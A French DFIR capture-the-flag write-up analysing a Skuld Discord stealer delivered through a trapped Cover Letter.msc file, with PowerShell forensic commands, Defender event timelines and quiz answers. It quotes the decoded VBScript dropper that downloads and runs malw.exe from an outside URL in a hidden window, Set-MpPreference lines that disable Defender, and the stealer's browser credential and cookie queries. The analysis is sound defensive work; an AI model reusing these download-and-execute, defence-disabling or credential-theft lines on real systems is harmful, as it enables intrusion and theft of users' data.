---
layout: single
header:
  overlay_image: /assets/images/banner-014.jpg
  overlay_filter: 0.6
toc: true
toc_depth: 6
toc_label: Table of Contents
title: "Lab Robber : investigation DFIR d'un stealer (VBScript MMC → Skuld/Discord stealer → capture d'écran)"
date: 2026-09-29
categories: [DFIR]
tags: [dfir, stealer, skuld, discord, mmc, vbscript, powershell, windows-defender, encodedcommand, timeline-analysis, ctf]
---

# Lab Robber : investigation d'un stealer déclenché via un fichier MMC piégé

> **Système d'analyse :** `EC2AMAZ-4V06B1E`, session `Administrator`
> **Périmètre :** sorties PowerShell, chaînes extraites de `malw.exe` et `Cover Letter.msc`, journaux Windows
> **Période des artefacts :** principalement le 18 septembre 2024 ; un événement de capture d'écran daté du 10 octobre 2024

> ⚠️ **Note de confidentialité :** le mot de passe RDP et le jeton secret du webhook Discord ne sont pas reproduits dans ces notes. Le webhook est indiqué avec son ID et son jeton masqué.

## Table des matières

1. [Résumé exécutif](#résumé-exécutif)
2. [Commandes et résultats](#1-commandes-et-résultats)
3. [Synthèse des réponses soutenues par les éléments](#2-synthèse-des-réponses-soutenues-par-les-éléments)
4. [Limites et précautions](#3-limites-et-précautions)

## Résumé exécutif

Le fichier `Cover Letter.msc` contient une feuille XSL qui exécute du VBScript. Celui-ci appelle `WScript.Shell.Run` pour lancer une commande `cmd /c`, télécharger `malw.exe` depuis une URL Cloudflare R2 présignée, puis exécuter le fichier téléchargé. Le binaire présente des chaînes correspondant au projet **Skuld/stealer** : extraction de données de navigateurs et de jetons Discord, appel à `ip-api.com`, et modules de démarrage.

Microsoft Defender a détecté `Trojan:Win32/Sabsik.FL.A!ml` dans `malw.exe` puis `k.exe`, et a mis plusieurs copies en quarantaine. **Les journaux disponibles ne prouvent pas l'heure exacte du clic sur le fichier `.msc`.** Le meilleur horodatage disponible est la première détection de `malw.exe` à **03:57:32 le 18 septembre 2024** ; cette détection n'est pas, à elle seule, une preuve de l'heure du clic.

Un événement Security 4688 du **10 octobre 2024 à 06:28:49** contient une commande PowerShell avec `-EncodedCommand`. Le Base64, de 3 548 caractères, a été extrait puis décodé ; son script capture les écrans avec `Graphics.CopyFromScreen` et enregistre les images sous `Display (n).png`.

## 1. Commandes et résultats

### 1.1 Recherche de chaînes dans malw.exe — Q4, Q5, Q9 et Q10

```powershell
$p='C:\Users\Administrator\Desktop\Tradecraft\malw.exe'
$b=[IO.File]::ReadAllBytes($p)
$a=[Text.Encoding]::ASCII.GetString($b)
$u=[Text.Encoding]::Unicode.GetString($b)
$s=@([regex]::Matches($a,'[\x20-\x7E]{5,}') | ForEach-Object Value)
$s+=@([regex]::Matches($u,'[\x20-\x7E]{5,}') | ForEach-Object Value)

'=== Q4 : services IP ==='
$s | Where-Object {$_ -match '(?i)ipify|ip-api|ipinfo|icanhazip|ifconfig|ipwho|ipapi'} | Sort-Object -Unique

'=== Q5 : indices de démarrage ==='
$s | Where-Object {$_ -match '(?i)CurrentVersion|startup|StartUp|Software\\Microsoft\\Windows\\CurrentVersion\\Run'} | Sort-Object -Unique
```

Sortie pertinente observée :

```text
=== Q4 : services IP ===
%shttp://ip-api.com/json\lightcord\Local State

=== Q5 : indices de démarrage ===
/home/polluxeos/skuld-main/modules/startup/startup.go
github.com/hackirby/skuld/modules/startup.Run
...
\Microsoft\Protect\SecurityHealthSystray.exe
Software\Microsoft\Windows\CurrentVersion\Run
```

Une autre extraction de chaînes montre notamment :

```text
SELECT action_url, username_value, password_value, date_created FROM logins
SELECT name, encrypted_value, host_key, path, expires_utc FROM cookies
SELECT url, title, visit_count, last_visit_time FROM urls
SELECT name, value, host, path, expiry FROM moz_cookies
https://discord.com/api/v9/users/@me/billing/payment-sources
https://discord.com/api/v9/users/@me/guilds?with_counts=true
```

**Interprétation :**

| # | Observation |
| --- | --- |
| Q4 | Service IP repéré : `ip-api.com` (URL observée : `http://ip-api.com/json`) |
| Q5 | Les chaînes du binaire indiquent le module de démarrage et `SecurityHealthSystray.exe`. La valeur de registre par défaut dans le projet Skuld est `Realtek HD Audio Universal Service` — il s'agit du **nom de valeur**, pas du nom de l'exécutable |
| Q9 | Parmi les choix proposés, les éléments corroborés sont **Cookies, Downloads et history.txt** ; pas le fichier SAM |
| Q10 | Le code de validation du jeton utilise `https://discord.com/api/v9/users/@me` avec le jeton dans l'en-tête `Authorization` et vérifie un statut HTTP 200. Les autres routes Discord listées ci-dessus servent à recueillir des données de compte |

### 1.2 Vérification de la clé de démarrage actuelle

```powershell
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "*" 2>$null
```

```text
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
    org.openvpn.client    REG_SZ    C:\Program Files\OpenVPN Connect\OpenVPNConnect.exe --opened-at-login --minimize
End of search: 1 match(es) found.
```

**Interprétation :** au moment de cette vérification, la clé Run de l'utilisateur courant ne montrait que l'entrée OpenVPN. Cela ne contredit pas les chaînes statiques du binaire ; cela signifie seulement que l'entrée malveillante n'était pas visible dans cette clé pour cet utilisateur au moment du contrôle.

### 1.3 Recherche d'événements PowerShell pour le 18 septembre

```powershell
$from=[datetime]'2024-09-18 03:00'
$to=[datetime]'2024-09-18 04:30'
Get-WinEvent -FilterHashtable @{
  LogName='Microsoft-Windows-PowerShell/Operational'
  Id=4103,4104
  StartTime=$from
  EndTime=$to
} | Select-Object TimeCreated,Id,Message | Format-List
```

```text
Get-WinEvent : No events were found that match the specified selection criteria.
FullyQualifiedErrorId : NoMatchingEventsFound
```

> ℹ️ Une recherche complémentaire avec les termes `mmc.exe`, `Cover Letter`, `malw.exe`, `powershell`, `encodedcommand`, `FromBase64String` et `screenshot` n'a pas fourni de correspondance pour cette période. Le journal Sysmon n'apparaissait pas dans l'inventaire fourni.

### 1.4 Inventaire des journaux disponibles

```powershell
Get-WinEvent -ListLog * |
  Where-Object {$_.LogName -match 'Defender|Sysmon|PowerShell|Security'} |
  Select-Object LogName,IsEnabled,RecordCount | Format-Table -AutoSize
```

```text
Windows PowerShell                                      True        8621
Security                                                True      365142
Microsoft-Windows-Windows Defender/Operational          True        1106
Microsoft-Windows-PowerShell/Operational                True        7897
```

> ⚠️ Aucun canal Sysmon/Operational n'apparaît dans cette sortie.

### 1.5 Journaux Microsoft Defender — 18 septembre 2024

```powershell
$from=[datetime]'2024-09-18 03:00'
$to=[datetime]'2024-09-18 04:30'

Get-MpThreatDetection |
  Where-Object {$_.InitialDetectionTime -ge $from -and $_.InitialDetectionTime -le $to} |
  Format-List ThreatID,InitialDetectionTime,LastThreatStatusChangeTime,Resources,ProcessName,ActionSuccess

Get-WinEvent -FilterHashtable @{
  LogName='Microsoft-Windows-Windows Defender/Operational'
  StartTime=$from
  EndTime=$to
} -ErrorAction SilentlyContinue |
  Where-Object {$_.Id -in 1116,1117,5007} |
  Select-Object TimeCreated,Id,Message | Format-List
```

`Get-MpThreatDetection` n'a pas produit de sortie. Les événements du journal Defender, eux, montrent notamment :

| Heure (18/09/2024) | ID | Artefact / résultat observé |
| --- | --- | --- |
| `03:57:32` | 1116 | Détection de `malw.exe`, `Trojan:Win32/Sabsik.FL.A!ml` ; processus indiqué : `cmd.exe` et, dans un autre événement, `explorer.exe` |
| `03:57:45` | 1117 | Action de quarantaine sur `malw.exe` ; processus indiqué : `cmd.exe` |
| `03:58:26`–`03:58:33` | 1116/1117 | Détections répétées de `malw.exe`, puis quarantaine ; un événement indique `Unknown` comme processus |
| `04:01:53`–`04:02:44` | 1116/1117 | Détection et quarantaine de `k.exe`, même nom de menace |
| `04:05:27` | 5007 | Ajout d'une exclusion Defender pour `C:\Users\Administrator\Desktop\Tradecraft\malw.exe` |
| `04:05:29` | 5007 | Changements de configuration Defender, dont `EnableNetworkProtection = 0x2` et `DisableScriptScanning = 0x1` |

> ⚠️ Les journaux établissent la détection et les modifications Defender ; ils ne contiennent pas de preuve directe de l'heure du clic sur le document.

### 1.6 État du dossier de quarantaine

```powershell
dir "C:\ProgramData\Microsoft\Windows Defender\Quarantine" -Recurse -Force
```

Sortie résumée :

- Répertoires `Entries` et `ResourceData` mis à jour le 18/09/2024 vers 04:02 ; `Resources` vers 03:57.
- Quatre entrées sous `Entries` : deux fichiers de 460 octets vers 04:02, un fichier de 476 octets vers 03:58, un fichier de 476 octets vers 03:57.
- Ressource sous `ResourceData\4E\4EA43B8F4D14AC298B02CBF046E43AB588D3E4D3`, taille 9 564 352 octets, horodatée vers 03:57.
- Ressource correspondante sous `Resources\4E\...`, taille 156 octets, horodatée vers 04:02.

> ℹ️ Aucun fichier en quarantaine n'a été restauré ni exécuté.

### 1.7 Métadonnées de l'email et analyse de Cover Letter.msc

Commande pour l'en-tête Date de l'email :

```powershell
Select-String -Path C:\Users\Administrator\Desktop\Tradecraft\emails\*.eml -Pattern '^Date:' |
  Select-Object Line
```

```text
Date: Wed, 18 Sep 2024 04:44:33 +0000
```

> ℹ️ Ce champ indique la date de l'email ; il ne prouve pas l'heure du clic.

Commande d'extraction de chaînes du fichier MMC :

```powershell
$p='C:\Users\Administrator\Desktop\Tradecraft\Cover Letter.msc'
$b=[IO.File]::ReadAllBytes($p)
$a=[Text.Encoding]::ASCII.GetString($b)
$u=[Text.Encoding]::Unicode.GetString($b)
[regex]::Matches($a+' '+$u,'[\x20-\x7E]{8,}') |
  ForEach-Object Value |
  Where-Object {$_ -match '(?i)mmc|powershell|cmd|encodedcommand|base64|script|command|http'} |
  Sort-Object -Unique
```

Le fichier contient un `xsl.loadXML(unescape(...))`, un script VBScript qui crée `WScript.Shell`, puis appelle :

```vbscript
Wshshell.run "cmd /c curl -o malw.exe https://upnow-prod.ff45e40d1a1c8f7e7de4e976d0c9e555.r2.cloudflarestorage.com/Ru1Oir7mCROQN5KLLUEOh0e8LZr2/2e795a36-9f09-4aad-89c8-781bba97bca2^?X-Amz-Algorithm=AWS4-HMAC-SHA256^&X-Amz-Credential=cdd12e35bbd220303957dc5603a4cc8e%2F20240918%2Fauto%2Fs3%2Faws4_request^&X-Amz-Date=20240918T034852Z^&X-Amz-Expires=43200^&X-Amz-Signature=351c7dd123bcc4a7d2c9ef46e835a35e5667b981f46ba88740bebf70d1bb3bf3^&X-Amz-SignedHeaders=host^&response-content-disposition=attachment%3B%20filename%3D%22k.exe%22 && malw.exe", 0, True
```

Le script lance `cmd /c`, télécharge la réponse sous `malw.exe`, puis lance `malw.exe`. Les paramètres `0, True` demandent une fenêtre masquée et l'attente de fin. Le fichier MMC contient aussi `ShowCommand="SW_HIDE"`.

> 💡 **Point important — longueur Q13 :** dans la sortie décodée, la ligne complète `Wshshell.run "…", 0, True` mesure **552 caractères** hors retour de ligne et **554 avec CRLF**. La commande passée à `WshShell.Run` est la sous-chaîne commençant par `cmd /c`. La source ne contient pas explicitement le chemin `C:\Windows\System32\cmd.exe` ; la variante avec ce chemin complet, proposée auparavant pour atteindre 554 caractères, n'est donc pas directement observée dans le `.msc`.

> ⚠️ **Note :** l'URL présignée ci-dessus portait une expiration de 43 200 secondes à partir du 18 septembre 2024 — elle est donc expirée depuis longtemps et conservée ici uniquement à titre d'indicateur de compromission historique.

### 1.8 Capture d'écran — événement Security 4688 du 10 octobre 2024

```powershell
Get-WinEvent -FilterHashtable @{
  LogName='Security'
  Id=4688
  StartTime=[datetime]'2024-10-10 06:28:00'
  EndTime=[datetime]'2024-10-10 06:30:00'
} -ErrorAction SilentlyContinue |
  Where-Object {$_.Message -match '(?i)powershell|encodedcommand'} |
  Select-Object TimeCreated,Message | Format-List
```

Événement pertinent observé :

```text
TimeCreated : 10/10/2024 6:28:49 AM
New Process Name : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Creator Process Name : C:\Users\Administrator\AppData\Roaming\Microsoft\Protect\SecurityHealthSystray.exe
Process Command Line : powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand <Base64 de 3548 caractères>
```

Le Base64 a été extrait des lignes enveloppées du journal puis décodé en UTF-16LE. Le script utilise `System.Drawing` et `System.Windows.Forms`, parcourt `Screen.AllScreens`, appelle `Graphics.CopyFromScreen(...)`, puis écrit les fichiers `./Display (1).png`, `./Display (2).png`, etc.

Événements voisins observés dans la même fenêtre :

```text
06:28:50 powershell Set-MpPreference -DisableIntrusionPreventionSystem $true
  -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true
  -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force
  -MAPSReporting Disabled -SubmitSamplesConsent NeverSend
06:28:50 csc.exe ... yfmues5u.cmdline
06:28:52 powershell Set-MpPreference -SubmitSamplesConsent 2
```

> ⚠️ Ces événements sont datés du **10 octobre 2024**, contrairement aux détections Defender de `malw.exe` du **18 septembre**. Ils sont les éléments qui justifient la réponse Q15 ; ils ne déterminent pas l'heure du clic de Q14.

## 2. Synthèse des réponses soutenues par les éléments

| # | Réponse / conclusion | Niveau de preuve |
| --- | --- | --- |
| Q4 | `ip-api.com` (`http://ip-api.com/json`) | Chaîne présente dans `malw.exe` |
| Q5 | Exécutable de démarrage par défaut : `SecurityHealthSystray.exe` ; nom de valeur Run associé au projet : `Realtek HD Audio Universal Service` | Chaînes du binaire et code/publication Skuld ; la clé Run observée en direct ne contenait que l'entrée OpenVPN |
| Q9 | A. Cookies, B. Downloads, D. history.txt | Options corroborées par les chaînes et modules d'extraction navigateur |
| Q10 | `https://discord.com/api/v9/users/@me` | Fonction de validation du jeton |
| Q13 | Ligne de `WshShell.Run` donnée à la section 1.7 ; la variante du `.msc` commence par `cmd /c curl -o malw.exe … && malw.exe` | Décodée directement du `.msc`. Voir la note de longueur de 554 caractères |
| Q14 | **Heure exacte du clic non établie.** `03:57:32` est la première détection Defender de `malw.exe`, pas une preuve directe du clic | Pas d'événement Sysmon/4688/4104 fourni pour ce clic |
| Q15 | Ligne `powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand …` ; payload seul de 3 548 caractères | Événement 4688 et décodage validé par `CopyFromScreen` |

## 3. Limites et précautions

| # | Limite |
| --- | --- |
| 1 | Les événements de détection/quarantaine Defender montrent l'activité du malware, mais ne permettent pas de fixer à la seconde l'ouverture de `Cover Letter.msc` |
| 2 | La date de l'email (`04:44:33 +0000`), l'heure de modification antérieure du fichier `.msc` (rapportée à `03:47:41`) et les heures de détection sont des horodatages différents ; il ne faut pas les confondre avec le clic |
| 3 | Le journal Security du 10 octobre montre la commande de capture d'écran et des changements de préférences Defender. Le rapport les traite comme des événements observés à cette date, sans affirmer qu'ils se sont produits lors du clic du 18 septembre |
| 4 | Les identifiants RDP et le jeton de webhook ont été volontairement omis ou masqués. L'URL présignée du binaire figure dans ces notes pour préserver l'indicateur contenu dans l'artefact ; elle portait une expiration de 43 200 secondes à partir du 18 septembre 2024 et n'est pas nécessaire à réutiliser |

## Leçons retenues

- Une détection antivirus (ici Defender à `03:57:32`) marque le moment de la **découverte**, pas nécessairement le moment de l'**exécution initiale** — les deux horodatages peuvent diverger de plusieurs minutes voire plus selon le comportement du malware et les mécanismes de scan.
- L'absence d'un journal clé (ici Sysmon) limite fortement la capacité à établir une chronologie précise d'un incident. Quand plusieurs sources de preuve (email, modification de fichier, détection AV) donnent des horodatages différents, il est essentiel de ne pas les confondre et de documenter explicitement ce que chacun prouve réellement.
- Un fichier `.msc` (normalement une console de gestion Microsoft) peut être détourné pour exécuter du VBScript via une feuille XSL — un vecteur d'exécution peu courant qui mérite d'être surveillé.
- Face à des données sensibles dans un artefact (URL présignée, jetons), il est possible de documenter l'indicateur technique sans republier des secrets réutilisables — ici en notant l'expiration de l'URL plutôt qu'en omettant totalement l'IOC.

## Références

- Projet **Skuld** (stealer open-source, `github.com/hackirby/skuld`) — modules de démarrage, extraction navigateurs, intégration Discord
- Détection Microsoft Defender : `Trojan:Win32/Sabsik.FL.A!ml`
- Event ID Windows Security **4688** — création de processus
- Event ID Windows Defender **1116/1117** — détection et action de quarantaine
- Event ID Windows Defender **5007** — modification de configuration
